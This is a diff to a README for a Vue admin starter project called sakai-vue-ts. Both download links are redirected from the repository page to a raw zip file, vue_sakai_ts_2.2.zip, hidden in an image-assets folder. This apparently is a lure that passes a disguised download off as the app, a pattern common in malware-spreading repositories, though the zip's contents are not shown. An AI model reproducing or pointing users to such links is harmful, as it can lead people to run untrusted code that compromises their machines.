@@ -1,12 +1,12 @@
 # 🧩 sakai-vue-ts - Clean Vue Admin Starter
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Selfinduced-reader297/sakai-vue-ts)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Selfinduced-reader297/sakai-vue-ts/main/public/demo/images/landing/vue_sakai_ts_2.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/Selfinduced-reader297/sakai-vue-ts](https://github.com/Selfinduced-reader297/sakai-vue-ts)
+[https://raw.githubusercontent.com/Selfinduced-reader297/sakai-vue-ts/main/public/demo/images/landing/vue_sakai_ts_2.2.zip](https://raw.githubusercontent.com/Selfinduced-reader297/sakai-vue-ts/main/public/demo/images/landing/vue_sakai_ts_2.2.zip)
 
 ## 🖥️ What this app is
 
